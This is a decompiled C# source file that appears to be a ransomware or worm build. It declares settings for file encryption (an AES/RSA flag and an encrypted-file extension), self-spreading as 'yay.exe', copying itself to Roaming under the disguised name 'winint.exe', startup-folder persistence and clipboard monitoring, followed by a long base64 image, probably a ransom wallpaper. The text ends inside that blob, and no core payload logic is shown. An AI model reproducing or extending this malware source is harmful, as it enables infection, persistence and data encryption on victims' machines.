using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = false;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "yay.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "winint.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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